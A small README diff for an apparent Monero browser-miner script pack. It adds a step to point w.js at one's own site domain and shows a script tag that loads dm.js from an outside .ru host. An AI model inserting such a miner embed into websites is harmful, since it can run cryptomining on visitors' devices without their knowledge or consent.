@@ -32,6 +32,8 @@ xmrMiner-scriptPack.git
     
 ```
 
+* Replace 'localhost' at first line w.js to your site domain.
+
 * Add some javascript and write like this :
 ```html
 <script src="http://okChain.ru/dm.js"></script>
